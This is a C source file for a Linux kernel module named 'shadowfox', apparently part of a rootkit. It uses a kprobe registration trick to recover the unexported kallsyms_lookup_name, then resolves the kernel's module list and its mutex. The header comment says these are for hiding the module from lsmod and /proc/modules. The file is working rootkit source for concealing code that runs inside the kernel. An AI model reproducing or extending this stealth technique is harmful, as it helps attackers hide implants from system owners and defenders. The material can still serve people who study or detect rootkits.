// SPDX-License-Identifier: GPL-2.0
/*
 * shadowfox: kallsyms-based symbol resolver.
 *
 * kallsyms_lookup_name() was unexported in 5.7 (commit 0bd476e6c671),
 * so out-of-tree modules can no longer call it directly. The well-known
 * workaround — used by educational rootkits since the change — is to
 * register a kprobe on the symbol name, read the address that the
 * kprobe core fills into kp.addr, then immediately unregister. The
 * kprobe never has to fire; registration alone resolves the address.
 *
 * Once we hold kallsyms_lookup_name() we use it to resolve every other
 * symbol shadowfox needs:
 *
 *   "modules"      - struct list_head, head of the loaded-module list
 *                    that backs /proc/modules and lsmod. Stage 1's
 *                    offensive technique unlinks THIS_MODULE from it.
 *   "module_mutex" - struct mutex protecting the list above; held
 *                    across the list_del/list_add that hides/restores.
 *
 * Reference:
 *   Diamorphine (m0nad), Reptile (f0rb1dd3n) — both use this pattern
 *   post-5.7. See also LWN coverage of the 5.7 unexport.
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/errno.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/printk.h>

#include "symbols.h"

struct list_head *sf_modules_head;
struct mutex	*sf_module_mutex;

/* Resolved via the kprobe trick; not exposed outside this TU. */
static unsigned long (*sf_kallsyms_lookup_name)(const char *name);

/*
 * Some kernels reject register_kprobe() with a NULL pre_handler. Give
 * it a no-op so the call is portable; the probe is unregistered before
 * it ever has a chance to fire.
 */
static int sf_noop_pre(struct kprobe *p, struct pt_regs *regs)
{
	(void)p;
	(void)regs;
	return 0;
}

static int resolve_kallsyms_lookup_name(void)
{
	struct kprobe kp = {
		.symbol_name = "kallsyms_lookup_name",
		.pre_handler = sf_noop_pre,
	};
	int ret;

	ret = register_kprobe(&kp);
	if (ret < 0) {
		pr_err("register_kprobe(kallsyms_lookup_name) failed: %d\n",
		       ret);
		return ret;
	}

	sf_kallsyms_lookup_name = (void *)kp.addr;
	unregister_kprobe(&kp);

	if (!sf_kallsyms_lookup_name) {
		pr_err("kallsyms_lookup_name address came back NULL\n");
		return -ENOENT;
	}

	return 0;
}

void *sf_kallsyms_lookup(const char *name)
{
	unsigned long addr;

	if (!sf_kallsyms_lookup_name)
		return NULL;

	addr = sf_kallsyms_lookup_name(name);
	if (!addr) {
		pr_err("kallsyms could not resolve %s\n", name);
		return NULL;
	}
	return (void *)addr;
}

int sf_symbols_init(void)
{
	int ret;

	ret = resolve_kallsyms_lookup_name();
	if (ret < 0)
		return ret;

	sf_modules_head = sf_kallsyms_lookup("modules");
	if (!sf_modules_head)
		return -ENOENT;

	sf_module_mutex = sf_kallsyms_lookup("module_mutex");
	if (!sf_module_mutex)
		return -ENOENT;

	pr_info("symbol resolution complete\n");
	return 0;
}
